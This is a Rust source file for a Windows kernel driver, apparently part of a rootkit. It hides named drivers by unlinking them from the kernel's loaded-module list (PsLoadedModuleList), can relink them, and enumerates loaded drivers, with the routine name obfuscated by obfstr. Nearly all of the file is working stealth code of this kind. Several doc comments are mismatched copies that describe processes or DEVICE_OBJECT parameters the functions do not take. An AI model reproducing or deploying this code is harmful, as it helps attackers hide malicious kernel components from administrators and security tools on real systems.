use {
    obfstr::obfstr, 
    spin::{lazy::Lazy, mutex::Mutex},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY, 
    core::sync::atomic::{AtomicPtr, Ordering},
    alloc::{boxed::Box, string::String, vec::Vec}, 
    crate::utils::uni,
    shared::{
        structs::{
            DriverInfo, HiddenDriverInfo, TargetDriver, LIST_ENTRY
        }, 
        vars::MAX_DRIVER
    },  
    wdk_sys::{
        ntddk::MmGetSystemRoutineAddress, NTSTATUS, STATUS_INVALID_PARAMETER, 
        STATUS_SUCCESS, STATUS_UNSUCCESSFUL
    } 
};

pub mod ioctls;

/// List of target drivers protected by a mutex.
static DRIVER_INFO_HIDE: Lazy<Mutex<Vec<HiddenDriverInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER))); 

pub struct Driver;

impl Driver {
    /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
    ///
    /// # Parameters
    /// 
    /// - `process`:  A pointer to the `TargetProcess` structure.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn driver_toggle(driver: *mut TargetDriver) -> NTSTATUS {
        let name = &(*driver).name;
        if (*driver).enable {
            Self::hide_driver(name)
        } else {
            Self::unhide_driver(name)
        }
    }

    /// Hides the driver by unlinking it from the loaded module list.
    ///
    /// # Parameters
    /// 
    /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    unsafe fn hide_driver(driver_name: &String) -> NTSTATUS {
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
        let func = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;

        if func.is_null() {
            log::error!("PsLoadedModuleList is null");
            return STATUS_UNSUCCESSFUL;
        }

        let current = func as *mut LIST_ENTRY;
        let mut next = (*func).InLoadOrderLinks.Flink as *mut LIST_ENTRY;

        while next != current {
            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            let buffer = core::slice::from_raw_parts((*list_entry).BaseDllName.Buffer, ((*list_entry).BaseDllName.Length / 2) as usize);
            
            let name = String::from_utf16_lossy(buffer);
            if name.contains(driver_name) {
                let next = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
                let previous = (*list_entry).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
                let list = LIST_ENTRY {
                    Flink: next as *mut LIST_ENTRY,
                    Blink: previous as *mut LIST_ENTRY,
                };

                let mut driver_info = DRIVER_INFO_HIDE.lock();
                let list_ptr = Box::into_raw(Box::new(list));
                let driver_entry = Box::into_raw(Box::new(*list_entry));
            
                driver_info.push(HiddenDriverInfo  {
                    name,
                    list_entry: AtomicPtr::new(list_ptr),
                    driver_entry: AtomicPtr::new(driver_entry)
                });
                
                (*next).InLoadOrderLinks.Blink = previous as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*previous).InLoadOrderLinks.Flink = next as *mut winapi::shared::ntdef::LIST_ENTRY;

                (*list_entry).InLoadOrderLinks.Flink = list_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*list_entry).InLoadOrderLinks.Blink = list_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
                break;
            }

            next = (*next).Flink;
        }
        
        STATUS_SUCCESS
    }

    /// Hides the driver by unlinking it from the loaded module list.
    ///
    /// # Parameters
    /// 
    /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    unsafe fn unhide_driver(driver_name: &str) -> NTSTATUS {
        let mut driver_info = DRIVER_INFO_HIDE.lock();

        if let Some(index) = driver_info.iter().position(|p| p.name == driver_name) {
            let driver = &driver_info[index];
            let list_entry = driver.list_entry.load(Ordering::SeqCst);
            if list_entry.is_null() {
                log::error!("List entry stored in AtomicPtr is null");
                return STATUS_INVALID_PARAMETER;
            }

            let driver_entry = driver.driver_entry.load(Ordering::SeqCst);
            (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
            (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;

            let next = (*driver_entry).InLoadOrderLinks.Flink; // Driver (3)
            let previous = (*driver_entry).InLoadOrderLinks.Blink; // Driver (1)

            (*next).Blink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
            (*previous).Flink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;

            driver_info.remove(index);
        } else {
            return STATUS_UNSUCCESSFUL;
        }
        
        STATUS_SUCCESS
    }

    /// Enumerates loaded drivers and stores the information in the provided buffer.
    ///
    /// # Parameters
    /// 
    /// - `driver_info`: A pointer to a buffer where `DriverInfo` structures will be stored.
    /// - `information`: A mutable reference to a `usize` that will store the total size of the information written.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    pub unsafe fn enumerate_driver(driver_info: *mut DriverInfo, information: &mut usize) -> Result<(), NTSTATUS> {
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
        let ldr_data = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
    
        if ldr_data.is_null() {
            log::error!("PsLoadedModuleList is null");
            return Err(STATUS_UNSUCCESSFUL);
        }
    
        let current = ldr_data as *mut winapi::shared::ntdef::LIST_ENTRY;
        let mut next = (*ldr_data).InLoadOrderLinks.Flink;
        let mut count = 0;
    
        while next != current {
            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            let buffer = core::slice::from_raw_parts(
                (*list_entry).BaseDllName.Buffer,
                ((*list_entry).BaseDllName.Length / 2) as usize,
            );
    
            // Driver name
            let name = (*driver_info.offset(count)).name.as_mut();
            core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
    
            // Driver address
            (*driver_info.offset(count)).address = (*list_entry).DllBase as usize;

            // Driver index
            (*driver_info.offset(count)).index = count as u8;
    
            *information += core::mem::size_of::<DriverInfo>();
            count += 1;
    
            next = (*next).Flink;
        }
    
        Ok(())
    }
}
